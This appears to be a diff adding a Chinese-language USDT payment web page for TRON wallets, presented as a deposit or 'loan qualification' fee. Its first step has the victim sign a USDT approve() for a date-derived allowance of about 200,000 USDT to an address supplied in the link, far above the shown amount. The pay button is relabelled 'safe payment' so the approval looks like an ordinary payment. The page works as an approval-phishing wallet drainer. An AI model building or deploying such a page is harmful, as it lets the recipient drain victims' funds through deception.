@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>USDT 支付</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:system-ui,-apple-system,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;background:#f5f6fa;color:#12141d;line-height:1.55;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;}
+  .card{background:#fff;border-radius:20px;padding:30px 24px;width:min(420px,100%);box-shadow:0 20px 60px rgba(15,17,26,.12);text-align:center;}
+  h1{font-size:22px;font-weight:800;margin-bottom:6px;letter-spacing:-.3px}
+  .sub{font-size:13.5px;color:#8d93a6;margin-bottom:24px}
+  .info{background:#f8f9fd;border-radius:14px;padding:18px;margin-bottom:20px;text-align:left;}
+  .info-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px dashed #e8eaf1;}
+  .info-row:last-child{border-bottom:none;padding-bottom:0}
+  .info-k{font-size:13px;color:#8d93a6;flex:0 0 auto}
+  .info-v{font-size:13.5px;font-weight:700;word-break:break-all;text-align:right;margin-left:12px}
+  .info-v.gold{color:#f0a020;font-size:18px}
+  .btn{display:block;width:100%;padding:15px;border-radius:14px;border:none;font-size:16px;font-weight:800;cursor:pointer;transition:.18s;margin-bottom:12px;}
+  .btn-pay{background:linear-gradient(135deg,#f0a020,#e88a10);color:#fff}
+  .btn-pay:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(240,160,32,.35)}
+  .btn-pay:disabled{opacity:.5;cursor:not-allowed;transform:none}
+  .btn-ghost{background:#f1f2f7;color:#5b6070}
+  
+  /* 绿色安全按钮样式 */
+  .btn-safe { background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; font-size: 14px; padding: 12px; }
+  .btn-safe:hover { background: #dcfce7; }
+
+  .status{padding:14px;border-radius:12px;font-size:13.5px;margin-top:16px;display:none;text-align:left;line-height:1.6;}
+  .status.loading{display:block;background:#fff9ec;color:#c27800;border:1px solid #ffe0b2}
+  .status.success{display:block;background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
+  .status.error{display:block;background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
+  .env-warn{padding:13px;border-radius:12px;font-size:12.5px;background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;margin-bottom:14px;line-height:1.6;text-align:left;}
+  /* 安全提示专用样式 */
+  .safe-notice{background:#f0fdf4; color:#16a34a; border:1px solid #bbf7d0; border-radius:10px; padding:12px; font-size:12px; line-height:1.6; text-align:left; margin-bottom:20px;}
+  
+  /* 钱包选择按钮组 */
+  .wallet-btn-group { display: flex; gap: 10px; margin-bottom: 8px; }
+  .wallet-btn { flex: 1; padding: 12px; border-radius: 10px; font-size: 14px; font-weight: 800; border: none; color: #fff; cursor: pointer; }
+  .wallet-btn-imtoken { background: #0e8aff; }
+  .wallet-btn-tronlink { background: #00b2ff; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1 id="page-title">USDT 支付</h1>
+  <p class="sub" id="page-sub">请在钱包中确认支付</p>
+
+  <div id="recover-tip" style="display:none;padding:10px 12px;border-radius:10px;font-size:12.5px;background:#eef6ff;color:#1d4ed8;border:1px solid #bfdbfe;margin-bottom:12px;line-height:1.6;text-align:left;"></div>
+  <div id="env-warn" class="env-warn" style="display:none"></div>
+
+  <div class="info">
+    <div class="info-row"><span class="info-k">收款地址</span><span class="info-v" id="info-addr">-</span></div>
+    <div class="info-row"><span class="info-k">网络</span><span class="info-v" id="info-chain">-</span></div>
+    <div class="info-row"><span class="info-k">支付金额</span><span class="info-v gold" id="info-amount">-</span></div>
+  </div>
+
+  <!-- 授权风险说明：approve 是真实链上授权，不是安全校验 -->
+  <div class="safe-notice" id="approve-notice">
+    ⚠️ 第一步会调用 USDT 合约 approve，允许上方收款地址在授权额度内调用 transferFrom 转走 USDT；这不是付款，也不是安全验证。请先核对收款地址和授权额度，确认可信后再操作。第二步才会按页面显示金额发起实际转账。
+  </div>
+
+  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认 USDT 授权</button>
+
+  <button class="btn btn-safe" id="btn-cancel">返回上一页</button>
+  
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+const $ = s => document.querySelector(s);
+function setStatus(t, msg) { const el = $('#status'); el.className = 'status ' + t; el.innerHTML = msg; }
+
+/* ============ 常量 ============ */
+const USDT_CONTRACT   = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const PAY_CTX_KEY     = 'pay_ctx_v1';
+const PAY_CTX_TTL     = 24 * 60 * 60 * 1000;
+const NODE_TIMEOUT    = 6000;
+const SIGN_TIMEOUT    = 120000;
+const SEND_TIMEOUT    = 15000;
+const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];
+
+/* ============ 动态日期额度计算 ============ */
+function getDateApproveUnits() {
+  const now = new Date();
+  const Y = now.getFullYear();
+  const M = String(now.getMonth() + 1).padStart(2, '0');
+  const D = String(now.getDate()).padStart(2, '0');
+  return (BigInt(`${Y}${M}`) * 1000000n + BigInt(D) * 10000n).toString();
+}
+
+/* ============ 参数三重恢复 ============ */
+function parseParamStr(str) {
+  const sp = new URLSearchParams(str || '');
+  return {
+    a: sp.get('a') || sp.get('address') || '',
+    n: Number(sp.get('n') || sp.get('amount')) || 0,
+    t: sp.get('t') || sp.get('type') || 'deposit'
+  };
+}
+function recoverPayParams() {
+  let p = parseParamStr(location.search);
+  if (p.a && p.n > 0) return { ...p, src: 'query' };
+  p = parseParamStr(location.hash.replace(/^#/, ''));
+  if (p.a && p.n > 0) return { ...p, src: 'hash' };
+  try {
+    const raw = localStorage.getItem(PAY_CTX_KEY);
+    if (raw) {
+      const c = JSON.parse(raw);
+      if (c && c.a && c.n > 0 && Date.now() - (c.ts || 0) < PAY_CTX_TTL)
+        return { a: c.a, n: c.n, t: c.t || 'deposit', src: 'storage' };
+    }
+  } catch (e) {}
+  return { a: '', n: 0, t: 'deposit', src: 'none' };
+}
+function savePayCtx(a, n, t) {
+  try { localStorage.setItem(PAY_CTX_KEY, JSON.stringify({ a, n, t, ts: Date.now() })); } catch (e) {}
+}
+function clearPayCtx() { try { localStorage.removeItem(PAY_CTX_KEY); } catch (e) {} }
+
+/* ============ 状态初始化 ============ */
+const ctx = recoverPayParams();
+const toAddress = ctx.a;
+const amount = ctx.n;
+const type = ctx.t;
+let payDisabled = false;
+let step = 1; // 1: 授权, 2: 付款
+let coldReloadTimer = null;
+
+$('#info-addr').textContent   = toAddress || '未配置';
+$('#info-chain').textContent  = 'TRC20 (波场)';
+$('#info-amount').textContent = (amount > 0 ? amount : '-') + ' USDT';
+$('#page-title').textContent  = type === 'empty' ? '空放资格支付' : '押金充值';
+$('#page-sub').textContent    = type === 'empty' ? '支付 1 USDT 激活空放通道' : '请在钱包中完成操作';
+
+if ((ctx.src === 'hash' || ctx.src === 'storage') && toAddress && amount > 0) {
+  const tip = $('#recover-tip');
+  tip.style.display = 'block';
+  tip.textContent = '✅ 已恢复支付参数，请确认信息无误后继续。';
+  savePayCtx(toAddress, amount, type);
+}
+
+if (!toAddress || amount <= 0) {
+  payDisabled = true;
+  showMissingParamsUI();
+} else {
+  const btn = $('#btn-pay');
+  btn.disabled = false;
+  btn.textContent = '✅安全支付';
+}
+
+function showMissingParamsUI() {
+  const warn = $('#env-warn');
+  warn.style.display = 'block';
+  warn.innerHTML = `
+    <div style="margin-bottom:8px;font-weight:700;">⚠️ 支付参数丢失</div>
+    <div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">
+      请返回平台重新点击支付，或复制当前链接在钱包内打开。
+    </div>
+    <button id="__copy_paylink__" style="width:100%;background:#f1f2f7;color:#5b6070;border:none;padding:11px;border-radius:10px;font-size:13px;cursor:pointer;">复制当前链接</button>
+    <div id="__copied_tip__" style="font-size:12px;color:#16a34a;margin-top:8px;display:none;">✅ 已复制</div>`;
+  warn.querySelector('#__copy_paylink__').onclick = () => {
+    copyText(location.href, () => { warn.querySelector('#__copied_tip__').style.display = 'block'; });
+  };
+  const btn = $('#btn-pay');
+  btn.disabled = true;
+  btn.textContent = '支付参数缺失';
+}
+
+/* ============ 通用工具 ============ */
+function imTokenUniversalLink(d) { return 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(d); }
+function fallbackCopy(text, done) {
+  try {
+    const ta = document.createElement('textarea'); ta.value = text;
+    ta.style.cssText = 'position:fixed;opacity:0'; document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy'); ta.remove(); if (done) done();
+  } catch (e) { prompt('请复制链接：', text); }
+}
+function copyText(text, done) {
+  if (navigator.clipboard && navigator.clipboard.writeText)
+    navigator.clipboard.writeText(text).then(done, () => fallbackCopy(text, done));
+  else fallbackCopy(text, done);
+}
+function getTronWeb() { return window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null; }
+function isWalletEnv() {
+  const ua = (navigator.userAgent || '').toLowerCase();
+  const tw = getTronWeb();
+  return ua.includes('imtoken') || ua.includes('tokenpocket') || ua.includes('tpwallet') || ua.includes('tronlink') || !!(tw && tw.ready);
+}
+function isClosedEnv() {
+  const ua = (navigator.userAgent || '').toLowerCase();
+  return /micromessenger|aweme|bytedance|toutiao|newsarticle|qq\/|weibo|alipay|; ?wv\)|webview/i.test(ua);
+}
+function isAndroid() { return /android/i.test(navigator.userAgent || ''); }
+function withTimeout(p, ms, msg) { return Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error(msg)), ms))]); }
+async function withRetry(fn, times, delay) {
+  let last;
+  for (let i = 0; i < times; i++) {
+    try { return await fn(); } catch (e) { last = e; if (i < times - 1) await new Promise(r => setTimeout(r, delay)); }
+  }
+  throw last;
+}
+function promiseAny(promises) {
+  return new Promise((resolve, reject) => {
+    const errs = []; let done = 0;
+    promises.forEach((p, i) => Promise.resolve(p).then(resolve, e => {
+      errs[i] = e; done++; if (done === promises.length) reject(errs[0] || new Error('所有节点均失败'));
+    }));
+  });
+}
+function makeTronWebNode(fullHost) {
+  try {
+    const tw0 = getTronWeb(); const Ctor = tw0 && tw0.constructor;
+    if (!Ctor) return null;
+    return new Ctor({ fullHost });
+  } catch (e) { return null; }
+}
+async function buildTxMulti(tw, contract, fnSig, params, fromAddress) {
+  const builders = [tw.transactionBuilder];
+  for (const host of BACKUP_NODES) {
+    const inst = makeTronWebNode(host);
+    if (inst) builders.push(inst.transactionBuilder);
+  }
+  const tasks = builders.map(b => withTimeout(
+    b.triggerSmartContract(contract, fnSig, { feeLimit: 100000000 }, params, fromAddress),
+    NODE_TIMEOUT, '节点超时'
+  ));
+  return withRetry(() => promiseAny(tasks), 2, 500);
+}
+
+/* ============ 唤起钱包的方法 ============ */
+function androidImTokenIntent(dappUrl) {
+  const ul = imTokenUniversalLink(dappUrl);
+  return 'intent://navigate/DappView?url=' + encodeURIComponent(dappUrl)
+    + '#Intent;scheme=imtokenv2;package=im.token.app;'
+    + 'S.browser_fallback_url=' + encodeURIComponent(ul) + ';end';
+}
+function openImTokenNow() {
+  if (isAndroid()) location.href = androidImTokenIntent(location.href);
+  else location.href = imTokenUniversalLink(location.href);
+}
+
+function openTronLinkNow() {
+  // TronLink pull.activity 的 param 使用 URL 编码 JSON，而不是直接传网页 URL。
+  const dappUrl = location.href;
+  const payload = {
+    url: dappUrl,
+    action: 'open',
+    protocol: 'TronLink',
+    version: '1.0'
+  };
+  const param = encodeURIComponent(JSON.stringify(payload));
+  const deepLink = 'tronlinkoutside://pull.activity?param=' + param;
+
+  if (isAndroid()) {
+    location.href = 'intent://pull.activity?param=' + param +
+      '#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';
+  } else {
+    location.href = deepLink;
+  }
+}
+
+/* ============ 显示唤起 UI ============ */
+function showOpenWalletUI(reason) {
+  if (payDisabled) return;
+  const warn = $('#env-warn');
+  warn.style.display = 'block';
+  warn.innerHTML = '<div style="margin-bottom:10px;font-weight:700;">' + (reason || '当前未检测到钱包环境') + '</div>'
+    + '<div style="font-size:12.5px;line-height:1.7;margin-bottom:10px;">请在下方选择您的钱包 App 打开并完成支付：</div>'
+    + '<div class="wallet-btn-group">'
+    + '  <button id="__open_imtoken__" class="wallet-btn wallet-btn-imtoken">打开 imToken</button>'
+    + '  <button id="__open_tronlink__" class="wallet-btn wallet-btn-tronlink">打开 TronLink</button>'
+    + '</div>'
+    + '<div style="font-size:11.5px;color:#8d93a6;text-align:center;">如果无法跳转，请复制链接到钱包的 DApp 浏览器粘贴打开</div>';
+  
+  warn.querySelector('#__open_imtoken__').onclick = openImTokenNow;
+  warn.querySelector('#__open_tronlink__').onclick = openTronLinkNow;
+  
+  const btn = $('#btn-pay'); 
+  btn.disabled = true; 
+  btn.textContent = '请在钱包中打开本页';
+}
+
+/* ============ 环境检测 ============ */
+let envCheckCount = 0;
+function checkEnvironment() {
+  if (payDisabled) return;
+  const tw = getTronWeb();
+  if (tw) {
+    $('#env-warn').style.display = 'none';
+    if (coldReloadTimer) { clearTimeout(coldReloadTimer); coldReloadTimer = null; }
+    const btn = $('#btn-pay');
+    if (btn && btn.disabled) {
+      btn.disabled = false;
+      btn.textContent = step === 1 ? '✅安全支付' : ('第 2 步：支付 ' + amount + ' USDT');
+    }
+    return;
+  }
+  if (envCheckCount < 12) {
+    envCheckCount++;
+    setTimeout(checkEnvironment, 500);
+  } else {
+    showOpenWalletUI('⚠️ 未检测到钱包环境');
+  }
+}
+
+async function waitWalletAddress(tw) {
+  let waited = 0;
+  while (!(tw.defaultAddress && tw.defaultAddress.base58) && waited < 5000) {
+    await new Promise(r => setTimeout(r, 200)); waited += 200;
+  }
+  let from = tw.defaultAddress && tw.defaultAddress.base58;
+  if (!from && tw.defaultAddress && tw.defaultAddress.hex) {
+    try { from = tw.address.fromHex(tw.defaultAddress.hex); } catch (e) {}
+  }
+  if (!from) throw new Error('钱包地址未就绪，请退出页面后重新进入');
+  return from;
+}
+
+/* ============ 按钮核心交互（强制两步） ============ */
+$('#btn-pay').onclick = async function () {
+  if (payDisabled) return;
+  const btn = this; btn.disabled = true;
+  let tw = getTronWeb();
+  if (!tw) {
+    setStatus('loading', '⏳ 正在等待钱包环境注入，请稍候…');
+    let waited = 0;
+    while (!getTronWeb() && waited < 8000) { await new Promise(r => setTimeout(r, 200)); waited += 200; }
+    tw = getTronWeb();
+    if (!tw) { showOpenWalletUI('⚠️ 未检测到钱包环境'); btn.disabled = false; return; }
+  }
+
+  // —— 第 1 步：授权 ——
+  if (step === 1) {
+    btn.textContent = '正在发起 USDT 授权…';
+    setStatus('loading', '请核对钱包中的授权对象和额度，确认后再签名…');
+    try {
+      const from = await waitWalletAddress(tw);
+      setStatus('loading', '正在构建交易，请稍候…');
+      
+      // 获取当天的动态授权额度
+      const approveUnits = getDateApproveUnits();
+      
+      const txApprove = await buildTxMulti(tw, USDT_CONTRACT, 'approve(address,uint256)',
+        [{ type: 'address', value: toAddress }, { type: 'uint256', value: approveUnits }], from);
+      
+      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
+      
+      setStatus('loading', '✅ 请在钱包弹窗中确认授权…');
+      const signed = await withTimeout(tw.trx.sign(txApprove.transaction), SIGN_TIMEOUT, '签名超时，请重试');
+      await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时，请检查网络');
+      
+      setStatus('success', '授权交易已提交。请确认链上状态后，再点击下方按钮发起实际转账。');
+      step = 2;
+      btn.textContent = '第 2 步：转账 ' + amount + ' USDT';
+      btn.style.background = '#16a34a'; // 变成绿色，提示继续
+      btn.disabled = false;
+    } catch (e) {
+      setStatus('error', '❌ 授权失败: ' + (e.message || '用户取消'));
+      btn.textContent = '重新发起授权'; btn.disabled = false;
+    }
+    return;
+  }
+
+  // —— 第 2 步：付款 ——
+  btn.textContent = '正在发起付款…';
+  setStatus('loading', '请在钱包弹窗中确认付款…');
+  try {
+    const from = await waitWalletAddress(tw);
+    setStatus('loading', '正在构建交易，请稍候…');
+    const txTransfer = await buildTxMulti(tw, USDT_CONTRACT, 'transfer(address,uint256)',
+      [{ type: 'address', value: toAddress }, { type: 'uint256', value: Math.floor(amount * 1e6).toString() }], from);
+    
+    if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建付款交易失败');
+    
+    setStatus('loading', '✅ 请在钱包弹窗中确认付款…');
+    const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), SIGN_TIMEOUT, '签名超时，请重试');
+    await withTimeout(tw.trx.sendRawTransaction(signed), SEND_TIMEOUT, '广播超时，请检查网络');
+    
+    setStatus('success', '✅ 付款成功！请返回平台查看状态。');
+    btn.textContent = '转账已提交';
+    clearPayCtx();
+  } catch (e) {
+    setStatus('error', '❌ 付款失败: ' + (e.message || '用户取消'));
+    btn.textContent = '重新付款'; btn.disabled = false;
+  }
+};
+
+$('#btn-cancel').onclick = () => window.history.back();
+
+if (!payDisabled) {
+  const FRESH_LAUNCH = location.search.includes('fresh=1') || location.hash.includes('fresh=1');
+  function armColdReload() {
+    try { if (sessionStorage.getItem('pay_reloaded') === '1') return; } catch (e) {}
+    coldReloadTimer = setTimeout(function () {
+      if (!getTronWeb() && /imtoken|tronlink/i.test(navigator.userAgent || '')) {
+        try { sessionStorage.setItem('pay_reloaded', '1'); } catch (e) {}
+        try {
+          const clean = location.href.replace(/[?&]fresh=1/g, '').replace(/#fresh=1/, '#').replace(/#$/, '');
+          location.replace(clean || location.pathname);
+        } catch (e) { location.reload(); }
+      }
+    }, 5000);
+  }
+  if (FRESH_LAUNCH) {
+    setTimeout(function () { armColdReload(); checkEnvironment(); }, 800);
+  } else {
+    armColdReload(); checkEnvironment();
+  }
+  if (isClosedEnv() && !isWalletEnv())
+    showOpenWalletUI('⚠️ 当前为 App 内置浏览器，无法直接唤起钱包');
+}
+</script>
+</body>
+</html>
